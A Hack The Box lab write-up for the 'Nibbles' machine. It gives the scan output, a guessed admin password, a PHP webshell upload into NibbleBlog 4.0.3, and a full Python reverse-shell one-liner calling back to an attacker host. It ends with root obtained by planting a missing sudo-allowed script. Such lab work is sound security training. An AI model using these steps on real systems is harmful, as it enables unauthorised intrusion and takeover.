---
title: Hack The Box - Nibbles (Without Metasploit)
date: 2021-01-09 22:56:00 +0800
categories: [hackthebox]
tags: [linux, php, sudo]
---

![](/assets/images/nibbles.png){:height="414px" width="615px"}

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.75 nibbles.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash 
$ nmap -sT -sV -sC -Pn -p- nibbles.htb 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 06:34 EST
Nmap scan report for nibbles.htb (10.10.10.75)
Host is up (0.014s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.81 seconds
```

# Enumeration (1)

## Port 80 `Apache httpd 2.4.18 ((Ubuntu))`

![](/assets/images/nibbles1.png)

There was only these 2 words on the index page. However in the `HTML` source code, we see something.

![](/assets/images/nibbles2.png)

By going to `/nibbleblog/`, there is a blog. 

![](/assets/images/nibbles3.png)

On the bottom right, we see what web app is powering this blog.

![](/assets/images/nibbles4.png)

Searching online, we can find the [Github repo](https://github.com/dignajar/nibbleblog) containing the source code of this web app. By going to `/nibbleblog/update.php`, the version of the blog is shown.

![](/assets/images/nibbles5.png)

Searching online, we see that there is an [article](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html) on exploiting this version and uploading webshells to this web app.

However, to do so, we will need to login via `/admin.php`. According to the `/nibbleblog/content/private/config.xml` link shown on the `/nibbleblog/update.php` page, we see that there might be a user called `admin`.

![](/assets/images/nibbles6.png)

Now we will just need to guess the password. Brute-forcing with `hydra` causes us to be blacklisted and unable to access the blog so we will need to be careful and gentle with our password guessing. After much guessing, the password turns out to be the name of this box `nibbles`.

![](/assets/images/nibbles7.png)

# Exploitation (1)

According to the [article](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html), we need to go under `Plugins` and scroll down to the `My image` plugin. There will be a `Configure` button, which brings us to a page where we can upload our web shell.

![](/assets/images/nibbles8.png)

I uploaded the [`simple-backdoor.php`](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php) and errors were shown.

![](/assets/images/nibbles9.png)

Despite that, our shell was successfully saved to `/nibbleblog/content/private/plugins/my_image/image.php`.

Browsing to `/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami` returns `nibbler`, hence we have achieved code execution on the machine.

Upgrading this to a more stable shell is easy by browsing to :

```
http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

which spawns a reverse shell connection to our `nc` listener that we setup beforehand.

```bash
$ sudo rlwrap nc -vlnp 1337
[sudo] password for kali: 
listening on [any] 1337 ...
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.75] 43896
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
```

# user.txt

The user flag is located in `nibbler` home directory.

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt
3dc94d9843e9bc20d33bb5905d15a8b6
```

# Enumeration (2)

If we check `nibbler`'s `sudo` rights, we see that he can run a certain script as `root`!

```bash
nibbler@Nibbles:/home/nibbler$ sudo -l                     

Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Checking the file revealed that this file doesn't exist! That means we can create a fake `monitor.sh` in `/home/nibbler/personal/stuff` which will spawn a shell as `root` when we execute it with `sudo`!

# Exploitation (2)

We simply echo `/bin/bash` into the `monitor.sh` file

```bash
nibbler@Nibbles:/home/nibbler$ mkdir -p personal/stuff 
nibbler@Nibbles:/home/nibbler$ echo "/bin/bash" > personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ chmod 777 personal/stuff/monitor.sh
```

and execute `monitor.sh` with `sudo` and get a shell as `root`!

```bash
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler# id
uid=0(root) gid=0(root) groups=0(root)
```

# root.txt

The root flag is located at `/root` as always.

```bash
root@Nibbles:/home/nibbler# cat /root/root.txt
c5e3XXXXXXXXXXXXXXXXXXXXXXXXXXXX
```




### Rooted ! Thank you for reading and look forward for more writeups and articles !